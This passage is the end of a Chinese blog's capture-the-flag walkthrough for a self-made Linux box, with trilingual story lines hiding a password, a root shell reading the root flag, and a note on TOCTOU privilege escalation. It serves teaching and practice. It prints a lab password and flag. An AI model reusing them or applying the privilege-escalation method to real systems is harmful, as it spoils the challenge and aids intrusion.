person.\n\n艾莉丝在牢狱开了间诊所，为牢狱的病人看病，并且有了新目标\nエリスは牢獄に診療所を開き、囚人たちの診療を行い、新たな目標を持った。\nEric opened a clinic \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the prison, treated the prisoners, and found a new purpose.\n\n在第五章，叛乱军攻上皇城之际，艾莉丝特意去找凯伊姆将自己赎身的钱给了凯伊姆\n第五章で、反乱軍が皇城に攻め込んだとき、エリスはわざわざカイムのもとを訪れ、自分の身請け金を彼に渡した。\nIn Chapter 5, as the rebel army stormed the royal castle, eric deliberately went to caim and gave him the money \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e her redemption.\n\n希望在这个战乱的时候能没有遗憾地离开，也为了向凯伊姆展示自己已经成功独立\nこの戦乱の中で、悔いなく去るために。そして、カイムに自分が自立できたことを示すために。\nShe wished to leave without regrets amidst the chaos of war—and to show caim that she had truly become independent.\n\n但是艾莉丝，你真的释怀了吗？\nでも、エリス……本当に心から解放されたのか？\nBut eric... have you truly found peace \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e your heart?\nThe final password: CialloCiall0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接切 \u003ccode\u003eroot\u003c/code\u003e ，读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@Prison:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \nflag{root-35dd4ab1f81016d5eb3b3a5d7494667f}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e打过\u003ccode\u003ethm\u003c/code\u003e的\u003ccode\u003ebreakme\u003c/code\u003e 的可能对提权有印象，因为\u003ccode\u003eTOCTOU\u003c/code\u003e和那里的很像，我也是在那里学到\u003ccode\u003eTOCTOU\u003c/code\u003e攻击的\u003c/p\u003e","title":"Personal - sunset","date":"2025-06-10","updated":"2025-06-10","tags":["自制","Linux","Knockd","hide","TOCTOU","encrypt"],"categories":"靶机","comments":true,"isEncrypted":true}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"Personalsunset"},"buildId":"7k1fvwHDLzxT7aO36hP7u","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>